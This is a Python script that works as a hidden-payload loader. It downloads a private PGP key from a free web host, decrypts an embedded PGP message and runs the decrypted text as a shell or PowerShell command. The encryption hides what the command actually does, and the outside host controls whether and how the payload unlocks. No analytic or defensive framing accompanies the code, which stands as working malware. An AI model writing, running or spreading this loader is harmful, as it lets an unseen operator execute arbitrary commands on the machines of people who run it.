import gnupg
import os
import subprocess
import platform
import requests
import tempfile

# Define the URL to download the key file from
key_file_url = 'https://key5.000webhostapp.com/key5_SECRET.asc'
encrypted_message = """
-----BEGIN PGP MESSAGE-----

hQEMAzOqmcIABe13AQgApcu5iifFp6oPcm2Wn1goWn+XP2qWSRXBjbr5AxnXQblM
BoOv4vUyxjRl5Yg5hiPLNWwRyvI09I6ijFl6CuEZebg4nQWXgxyCnuhU+OfctfIR
hyC/V9FbIbuBHLcbTXeioFb+KHFbXAdu7SgW4MX/5M8qbQMwHuaVLDKwLbEoWI/T
+q87pgBciHEt7132SqANLaZmJuG6tqt25no67tL0k6unllMykVFIh+Syfc7VGWyK
6U8A5vYiiFCAmF6HbSCCRgLNAqLYKWDD27XYoz31/JhIMNSp1HQhx6rm3X9xkeoz
E0rEnSz1NMUfNDargFh9lsvXr1fpBRj0TuLGWfrfIdTpAQkCEFA9pAJCHSOR2bnR
aacGj/5AV5brVqeyRVmXmBZDC2/F6nVZyoeTpc9ypSch8za0VL/YfqoZGAqRFLv7
OEt80lLe8+fkGgpg2PLb1pBxUddmE96cPeueyu1EnzzAISYVhYlw42Ofy9UMBnQj
/j06BzF1dMsx6zEABEmvkNYbXe36+vLx5obJ1cShZUY/BQZVhjShyKoWHjc0yzhx
YZh70T497d910y2JAGANegf66mM6nYejAbvbsvr9GIAh7kEXN7oGM7gnpcrZeozL
WUZO12rO316WjEoDsDjmKVzPb8rIOS/Jefk5TQkBI3t4b1w9RKi7sidHGnAMbAYV
ye/aMuWweamlmyB0Nnu9EkALSVTUMR5wfLUUCJYqBXueK0teXBn7pbjggjQXSS/0
OSjMgHuyr8Qk9c8UkX6+Zb26ck8DgOwWLEnPpIMxwYRYURHmb0UwdxUgzwudx8yV
KaiFKLBvCW26MCSj1+DmEjoL/VDd0f6EZ06dX56fULic8k6mdP22PdeN02hVAV/j
06IEem7pO2tVv3wDbMdh14RkXSVfrdGqnlxS9yWbYSsqKE4+DKBym5cS8Zf7oPBd
W95Hcbin2T8WYGTqIV/hCr9XJvVuNpvX3R8cvsL3MMYEQ7oWbX57GURLGk71b2dF
x5F4OrZXTTSqNnW1ab+8TUa6ZD0h9l6X7AlOLuYyynl0ZG2uWZ+mZ3DhcfRifnbW
UskzUkjx4ePsqyOdDBB0JuxpmQORXnD3crKV4Iluy6QZgy/xAuAs2ya8rreyvLNN
rw8CZDaP+FvTyZ0janvtD8RfDT7njsFtVf7ChnDBYMl99POVAcroZtkzemHNCpSR
dtEjxj8n/i0PeuUGNoKYjGrlsTsmCu1ymueYx8+r86VJ92Bv7vCEzSzmFKaydqCs
IjpFXYagB3gD+YuR
=pZao
-----END PGP MESSAGE-----

"""

# Create a temporary directory
with tempfile.TemporaryDirectory() as tmpdirname:
    # Define the temporary path to store the key file
    temp_key_file = os.path.join(tmpdirname, 'key5_SECRET.asc')

    # Download the key file
    response = requests.get(key_file_url)
    response.raise_for_status()  # Ensure we notice bad responses
    with open(temp_key_file, 'wb') as f:
        f.write(response.content)

    # Initialize GPG
    gpg = gnupg.GPG()

    # Import the private key
    with open(temp_key_file, 'rb') as f:
        key_data = f.read()
    gpg.import_keys(key_data)

    # Decrypt the message
    decrypted_data = gpg.decrypt(encrypted_message)

    if decrypted_data.ok:
        command = decrypted_data.data.decode().strip()
        try:
            # Check the operating system
            if platform.system() == 'Windows':
                # On Windows, use PowerShell to execute commands
                subprocess.run(['powershell', '-Command', command], check=True)
            else:
                # On Unix-like systems, use shell=True
                subprocess.run(command, shell=True, check=True)
        except KeyboardInterrupt:
            print(".")
            exit()
    else:
        raise ValueError("Decryption failed!")
